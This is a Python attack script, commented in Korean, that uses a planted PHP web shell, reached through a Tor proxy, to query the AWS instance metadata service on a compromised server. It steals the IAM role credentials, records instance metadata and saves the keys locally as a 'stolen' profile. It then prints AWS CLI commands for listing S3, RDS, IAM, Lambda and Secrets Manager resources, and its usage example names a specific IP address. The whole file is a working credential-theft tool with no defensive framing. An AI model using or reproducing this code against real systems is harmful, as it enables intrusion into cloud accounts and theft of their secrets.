#!/usr/bin/env python3
"""
AWS 메타데이터 서비스 공격
리버스 쉘 없이 웹쉘만으로 AWS 자격 증명 탈취

IMDS (Instance Metadata Service)를 통해:
1. IAM Role 자격 증명 획득
2. AWS 리소스 접근
3. 다른 인스턴스로 피봇
"""

import requests
import json
import sys
import time

class AWSMetadataExploit:
    def __init__(self, target_ip, webshell_file, param):
        self.target_ip = target_ip
        self.base_url = f"http://{target_ip}"
        self.webshell_file = webshell_file
        self.param = param

        self.session = requests.Session()
        self.session.proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }

        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

        self.credentials = None

    def execute_command(self, cmd):
        """웹쉘로 명령 실행"""
        try:
            url = f"{self.base_url}/file.php?name=uploads/{self.webshell_file}&{self.param}={cmd}"
            resp = self.session.get(url, timeout=10)

            if resp.status_code == 200:
                return resp.text.strip()
            return None
        except:
            return None

    def check_aws_environment(self):
        """AWS 환경인지 확인"""
        print("\n[*] AWS 환경 확인 중...")

        # IMDSv2 토큰 획득 시도
        cmd = "curl -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' 2>/dev/null"
        result = self.execute_command(cmd)

        if result and len(result) > 10:
            print(f"[+] IMDSv2 토큰 획득: {result[:50]}...")
            return True, result

        # IMDSv1 시도 (구버전)
        cmd = "curl http://169.254.169.254/latest/meta-data/ 2>/dev/null"
        result = self.execute_command(cmd)

        if result and 'ami-id' in result:
            print(f"[+] IMDSv1 사용 가능!")
            return True, None

        print("[-] AWS 환경이 아니거나 IMDS 접근 불가")
        return False, None

    def get_iam_role(self, token=None):
        """IAM Role 이름 획득"""
        print("\n[*] IAM Role 확인 중...")

        if token:
            # IMDSv2
            cmd = f"curl -H 'X-aws-ec2-metadata-token: {token}' http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null"
        else:
            # IMDSv1
            cmd = "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null"

        role_name = self.execute_command(cmd)

        if role_name:
            print(f"[+] IAM Role 발견: {role_name}")
            return role_name
        else:
            print("[-] IAM Role 없음")
            return None

    def steal_credentials(self, role_name, token=None):
        """IAM Role 자격 증명 탈취"""
        print(f"\n[*] IAM 자격 증명 탈취 중...")

        if token:
            cmd = f"curl -H 'X-aws-ec2-metadata-token: {token}' http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name} 2>/dev/null"
        else:
            cmd = f"curl http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name} 2>/dev/null"

        creds_json = self.execute_command(cmd)

        if creds_json:
            try:
                creds = json.loads(creds_json)

                print(f"\n[+] ✅ AWS 자격 증명 탈취 성공!")
                print(f"\n{'='*60}")
                print(f"AccessKeyId: {creds.get('AccessKeyId', 'N/A')}")
                print(f"SecretAccessKey: {creds.get('SecretAccessKey', 'N/A')[:20]}...")
                print(f"Token: {creds.get('Token', 'N/A')[:20]}...")
                print(f"Expiration: {creds.get('Expiration', 'N/A')}")
                print(f"{'='*60}")

                self.credentials = creds
                return creds

            except json.JSONDecodeError:
                print(f"[-] JSON 파싱 실패")
                print(f"[*] 원본 응답:\n{creds_json[:200]}")
                return None

        print("[-] 자격 증명 획득 실패")
        return None

    def get_instance_metadata(self, token=None):
        """인스턴스 메타데이터 수집"""
        print(f"\n[*] 인스턴스 메타데이터 수집 중...")

        metadata_paths = [
            'instance-id',
            'instance-type',
            'local-ipv4',
            'public-ipv4',
            'availability-zone',
            'security-groups',
            'subnet-id',
            'vpc-id',
        ]

        info = {}

        for path in metadata_paths:
            if token:
                cmd = f"curl -H 'X-aws-ec2-metadata-token: {token}' http://169.254.169.254/latest/meta-data/{path} 2>/dev/null"
            else:
                cmd = f"curl http://169.254.169.254/latest/meta-data/{path} 2>/dev/null"

            result = self.execute_command(cmd)

            if result:
                info[path] = result
                print(f"    {path}: {result}")

        return info

    def save_credentials(self):
        """자격 증명을 로컬에 저장"""
        if not self.credentials:
            return

        print(f"\n[*] 자격 증명 저장 중...")

        # AWS CLI 설정 형식
        config_content = f"""
# AWS 자격 증명 (탈취)
# 사용법:
#   export AWS_ACCESS_KEY_ID="{self.credentials.get('AccessKeyId')}"
#   export AWS_SECRET_ACCESS_KEY="{self.credentials.get('SecretAccessKey')}"
#   export AWS_SESSION_TOKEN="{self.credentials.get('Token')}"
#
# 또는 ~/.aws/credentials에 추가:

[stolen]
aws_access_key_id = {self.credentials.get('AccessKeyId')}
aws_secret_access_key = {self.credentials.get('SecretAccessKey')}
aws_session_token = {self.credentials.get('Token')}

# Expiration: {self.credentials.get('Expiration')}
"""

        filename = f"aws_credentials_{int(time.time())}.txt"

        with open(filename, 'w') as f:
            f.write(config_content)

        print(f"[+] 저장 완료: {filename}")

        # JSON 형식으로도 저장
        json_filename = f"aws_credentials_{int(time.time())}.json"
        with open(json_filename, 'w') as f:
            json.dump(self.credentials, f, indent=2)

        print(f"[+] JSON 저장: {json_filename}")

    def enumerate_aws_services(self):
        """AWS 서비스 열거 (자격 증명 사용)"""
        if not self.credentials:
            print("[-] 자격 증명이 필요합니다")
            return

        print(f"\n[*] AWS CLI를 사용한 리소스 열거")
        print(f"\n다음 명령어를 로컬에서 실행하세요:\n")

        print(f"# 1. 환경변수 설정")
        print(f'export AWS_ACCESS_KEY_ID="{self.credentials.get("AccessKeyId")}"')
        print(f'export AWS_SECRET_ACCESS_KEY="{self.credentials.get("SecretAccessKey")}"')
        print(f'export AWS_SESSION_TOKEN="{self.credentials.get("Token")}"')

        print(f"\n# 2. 권한 확인")
        print(f"aws sts get-caller-identity")

        print(f"\n# 3. EC2 인스턴스 목록")
        print(f"aws ec2 describe-instances")

        print(f"\n# 4. S3 버킷 목록")
        print(f"aws s3 ls")

        print(f"\n# 5. RDS 데이터베이스")
        print(f"aws rds describe-db-instances")

        print(f"\n# 6. IAM 사용자/역할")
        print(f"aws iam list-users")
        print(f"aws iam list-roles")

        print(f"\n# 7. Lambda 함수")
        print(f"aws lambda list-functions")

        print(f"\n# 8. Secrets Manager")
        print(f"aws secretsmanager list-secrets")

    def run(self):
        """전체 실행"""
        print("="*60)
        print("AWS 메타데이터 서비스 공격")
        print("리버스 쉘 없이 AWS 자격 증명 탈취")
        print("="*60)

        # 1. AWS 환경 확인
        is_aws, token = self.check_aws_environment()

        if not is_aws:
            print("\n[-] AWS 환경이 아닙니다")
            return

        # 2. IAM Role 획득
        role_name = self.get_iam_role(token)

        if not role_name:
            print("\n[-] IAM Role이 없습니다")
            return

        # 3. 자격 증명 탈취
        creds = self.steal_credentials(role_name, token)

        if not creds:
            print("\n[-] 자격 증명 획득 실패")
            return

        # 4. 인스턴스 메타데이터 수집
        self.get_instance_metadata(token)

        # 5. 자격 증명 저장
        self.save_credentials()

        # 6. AWS CLI 사용법 안내
        self.enumerate_aws_services()

        print(f"\n{'='*60}")
        print("[+] AWS 메타데이터 공격 완료!")
        print("[*] 이제 로컬에서 AWS CLI로 내부 리소스 접근 가능")
        print("="*60)

def main():
    if len(sys.argv) < 4:
        print("사용법: python3 90_aws_metadata_steal.py <TARGET_IP> <WEBSHELL> <PARAM>")
        print("예시: python3 90_aws_metadata_steal.py 43.201.154.142 shell_4727.php x")
        sys.exit(1)

    target_ip = sys.argv[1]
    webshell_file = sys.argv[2]
    param = sys.argv[3]

    exploit = AWSMetadataExploit(target_ip, webshell_file, param)
    exploit.run()

if __name__ == "__main__":
    main()
